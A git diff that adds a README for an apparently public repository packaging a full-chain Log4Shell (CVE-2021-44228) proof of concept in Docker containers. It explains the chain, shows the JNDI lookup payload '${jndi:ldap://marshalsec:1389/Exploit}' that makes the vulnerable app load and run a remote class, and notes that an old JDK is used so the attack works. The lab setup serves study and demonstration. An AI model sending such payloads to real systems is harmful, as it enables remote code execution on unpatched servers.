@@ -1,2 +1,32 @@
-# log4shell-dockerized
-Log4Shell dockerized full chain
+# Full-chain dockerized Log4Shell (CVE-2021-44228)
+
+Log4Shell (CVE-2021-44228) is a critical vulnerability in the popular log4j2 logging package.
+This vulnerability is extremely easy to exploit, and was fixed in log4j2 version 2.15.
+This repository combines several other repositories showcasing POC capabilities for the vulnrabilility but in fully dockerized environment.
+Executing the vulnerability demands: vulnerable code running log4j, an LDAP server receiving the request, and server serving the exploit as compiled java class.
+
+Further explanation cab be reached here:
+https://www.lunasec.io/docs/blog/log4j-zero-day/
+
+## Usage
+
+Build and run all the containers
+
+```bash
+sudo docker-compose up --build
+```
+
+Once everything is up and running, you could see the next message, indicating the exploit was successful:
+
+```
+marshalsec_1   | Send LDAP reference result for Exploit redirecting to http://http-server:8888/Exploit.class
+vuln_1         | Hello from exploit!
+vuln_1         | 17:26:26.531 [main] ERROR log4j - ${jndi:ldap://marshalsec:1389/Exploit}
+```
+
+Behind the scenes, the vulnerable code is requesting the `Exploit` class from the LDAP server, and executes it.
+You can freely modify the `exploit/Exploit.java` file to make custom exploits.
+
+## Notes
+
+In recent JDK version, the variable `com.sun.jndi.ldap.object.trustURLCodebase` is set to `false` by default, thus stopping effectively the attack. Thats why I set the java version to older than that.
